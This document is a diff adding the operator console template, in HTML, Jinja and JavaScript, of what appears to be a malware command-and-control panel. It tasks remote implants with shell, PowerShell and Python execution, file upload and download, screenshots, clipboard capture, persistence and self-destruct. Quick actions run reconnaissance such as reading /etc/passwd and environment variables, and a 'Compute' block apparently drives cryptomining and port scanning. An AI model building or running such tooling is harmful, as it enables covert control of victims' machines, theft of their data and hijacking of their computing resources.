@@ -1,0 +1,198 @@
+{% extends "base.html" %}
+{% block title %}Console &mdash; {{ agent.hostname or agent.id[:8] }}{% endblock %}
+{% block page_title %}Console &mdash; {{ agent.hostname or agent.id[:8] }}{% endblock %}
+{% block topbar_actions %}
+<span class="badge os-{{ (agent.os or 'unknown').split()[0]|lower }}">{{ agent.os }}</span>
+<span class="badge type">{{ agent.platform_type }}</span>
+{% if agent.is_alive %}<span class="badge alive">ONLINE</span>{% else %}<span class="badge dead">OFFLINE</span>{% endif %}
+{% endblock %}
+
+{% block content %}
+<div style="display:grid;grid-template-columns:1fr 280px;gap:20px">
+<div>
+  <div class="card" style="padding:0">
+    <div style="padding:14px 20px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+      <span style="font-size:14px;font-weight:600;color:var(--text-bright)">Terminal</span>
+      <div style="display:flex;gap:8px">
+        <select id="taskType" style="width:120px;padding:5px 10px;font-size:12px">
+          <option value="cmd">Shell CMD</option>
+          <option value="powershell">PowerShell</option>
+          <option value="python">Python</option>
+          <option value="sysinfo">Sysinfo</option>
+          <option value="upload">Upload</option>
+          <option value="download">Download</option>
+          <option value="screenshot">Screenshot</option>
+          <option value="clipboard">Clipboard</option>
+          <option value="persist">Persist</option>
+          <option value="kill">Self-Kill</option>
+        </select>
+        <button class="btn sm" onclick="clearConsole()">Clear</button>
+      </div>
+    </div>
+    <div class="console-box" id="consoleOutput" style="border-radius:0;border:none;min-height:400px">
+<span class="info">Session: {{ agent.id }}</span>
+<span class="info">Host:    {{ agent.hostname }} ({{ agent.username }})</span>
+<span class="info">OS:      {{ agent.os }} {{ agent.arch }}</span>
+<span class="info">IP:      {{ agent.ip_external }} / {{ agent.ip_internal }}</span>
+<span class="info">────────────────────────────────────────────</span>
+{% for t in tasks|reverse %}
+<span class="prompt">{{ agent.hostname }}$</span> <span class="output">[{{ t.task_type }}] {{ t.payload }}</span>
+{% if t.status == 'completed' %}
+<span class="output">{{ t.result }}</span>
+{% elif t.status == 'sent' %}
+<span class="info">[awaiting result...]</span>
+{% else %}
+<span class="info">[queued]</span>
+{% endif %}
+{% endfor %}
+</div>
+    <div class="console-input-wrap" style="border-radius:0 0 10px 10px;border-top:1px solid var(--border)">
+      <span class="prefix">{{ agent.hostname or '?' }}$</span>
+      <input type="text" id="cmdInput" placeholder="Enter command..." autofocus>
+    </div>
+  </div>
+</div>
+
+<div>
+  <div class="card">
+    <h2>Agent Info</h2>
+    <table style="font-size:12px">
+      <tr><td style="color:var(--text-dim);padding:5px 8px;width:90px">ID</td><td style="font-family:var(--font-mono);padding:5px 8px;word-break:break-all;font-size:11px">{{ agent.id }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Hostname</td><td style="padding:5px 8px;font-weight:500">{{ agent.hostname }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">User</td><td style="padding:5px 8px">{{ agent.username }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">OS</td><td style="padding:5px 8px">{{ agent.os }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Arch</td><td style="padding:5px 8px">{{ agent.arch }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Ext IP</td><td style="font-family:var(--font-mono);padding:5px 8px">{{ agent.ip_external }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Int IP</td><td style="font-family:var(--font-mono);padding:5px 8px">{{ agent.ip_internal }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Platform</td><td style="padding:5px 8px">{{ agent.platform_type }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Group</td><td style="padding:5px 8px">{{ agent.group_name }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">First Seen</td><td style="padding:5px 8px;font-size:11px">{{ agent.first_seen }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Last Seen</td><td style="padding:5px 8px;font-size:11px">{{ agent.last_seen }}</td></tr>
+      <tr><td style="color:var(--text-dim);padding:5px 8px">Sleep</td><td style="padding:5px 8px;font-family:var(--font-mono)">{{ agent.sleep_interval }}s &plusmn;{{ agent.jitter }}%</td></tr>
+    </table>
+  </div>
+  <div class="card">
+    <h2>Quick Actions</h2>
+    <div style="display:flex;flex-direction:column;gap:6px">
+      <button class="btn sm" onclick="quickCmd('whoami && id')">whoami</button>
+      <button class="btn sm" onclick="quickCmd('hostname && uname -a')">sysinfo</button>
+      <button class="btn sm" onclick="quickCmd('ip a || ipconfig /all')">network</button>
+      <button class="btn sm" onclick="quickCmd('ps aux || tasklist')">processes</button>
+      <button class="btn sm" onclick="quickCmd('cat /etc/passwd 2>/dev/null || net user')">users</button>
+      <button class="btn sm" onclick="quickCmd('ls -la / || dir C:\\\\')">list root</button>
+      <button class="btn sm" onclick="quickCmd('env || set')">env vars</button>
+      <button class="btn sm danger" onclick="sendKill()">Self-destruct</button>
+    </div>
+  </div>
+  <div class="card">
+    <h2 style="color:var(--purple)">Compute</h2>
+    <div style="display:flex;flex-direction:column;gap:6px">
+      <button class="btn sm primary" onclick="sendCmd(':start')">:start</button>
+      <button class="btn sm" onclick="sendCmd(':status')">:status</button>
+      <button class="btn sm" onclick="sendCmd(':log')">:log</button>
+      <button class="btn sm" onclick="sendCmd(':persist')">:persist</button>
+      <button class="btn sm" onclick="sendCmd(':sysinfo')">:sysinfo</button>
+      <button class="btn sm" onclick="sendCmd(':portscan')">:portscan</button>
+      <button class="btn sm danger" onclick="sendCmd(':stop')">:stop</button>
+      <button class="btn sm danger" onclick="sendCmd(':cleanup')">:cleanup</button>
+    </div>
+  </div>
+  <div class="card">
+    <h2>Notes</h2>
+    <textarea id="agentNote" rows="3" style="font-size:12px" placeholder="Add notes about this agent...">{{ agent.note }}</textarea>
+    <button class="btn sm" style="margin-top:8px;width:100%" onclick="saveNote()">Save Note</button>
+  </div>
+</div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const AGENT_ID = '{{ agent.id }}';
+const output = document.getElementById('consoleOutput');
+const input = document.getElementById('cmdInput');
+
+output.scrollTop = output.scrollHeight;
+
+const cmdHistory = [];
+let histIdx = -1;
+
+input.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && input.value.trim()) {
+    cmdHistory.unshift(input.value.trim());
+    histIdx = -1;
+    sendCmd(input.value.trim());
+    input.value = '';
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (histIdx < cmdHistory.length - 1) { histIdx++; input.value = cmdHistory[histIdx]; }
+  } else if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (histIdx > 0) { histIdx--; input.value = cmdHistory[histIdx]; }
+    else if (histIdx === 0) { histIdx = -1; input.value = ''; }
+  }
+});
+
+function sendCmd(cmd) {
+  const type = document.getElementById('taskType').value;
+  appendLine(`<span class="prompt">{{ agent.hostname }}$</span> <span class="output">[${type}] ${escapeHtml(cmd)}</span>`);
+  fetch('/api/task/create', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ agent_id: AGENT_ID, type, payload: cmd })
+  }).then(r => r.json()).then(d => {
+    appendLine(`<span class="info">[task ${d.task_id?.slice(0,8)} queued]</span>`);
+  });
+}
+
+function quickCmd(cmd) { sendCmd(cmd); }
+
+function sendKill() {
+  if (!confirm('KILL this agent? It will self-destruct and remove persistence.')) return;
+  const saved = document.getElementById('taskType').value;
+  document.getElementById('taskType').value = 'kill';
+  sendCmd('self-destruct');
+  document.getElementById('taskType').value = saved;
+}
+
+socket.on('task_result', data => {
+  if (data.agent_id && data.agent_id !== AGENT_ID) return;
+  appendLine(`<span class="output">${escapeHtml(data.result)}</span>`);
+});
+
+function appendLine(html) {
+  output.innerHTML += '\n' + html;
+  output.scrollTop = output.scrollHeight;
+}
+
+function clearConsole() { output.innerHTML = '<span class="info">Console cleared</span>'; }
+
+function escapeHtml(t) {
+  return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function saveNote() {
+  fetch(`/api/agent/${AGENT_ID}/update`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({note: document.getElementById('agentNote').value})
+  }).then(() => showNotification('Note saved', 'green'));
+}
+
+const seenTasks = new Set();
+document.querySelectorAll('#consoleOutput .info').forEach(el => {
+  const m = el.textContent.match(/\[task (\w+)/);
+  if (m) seenTasks.add(m[1]);
+});
+setInterval(() => {
+  fetch(`/api/tasks/${AGENT_ID}`).then(r => r.json()).then(tasks => {
+    tasks.filter(t => t.status === 'completed').forEach(t => {
+      const short = t.id.slice(0,8);
+      if (!seenTasks.has(short)) {
+        seenTasks.add(short);
+        appendLine(`<span class="info">[result for ${short}]</span>`);
+        appendLine(`<span class="output">${escapeHtml(t.result || '(empty)')}</span>`);
+      }
+    });
+  });
+}, 6000);
+</script>
+{% endblock %}
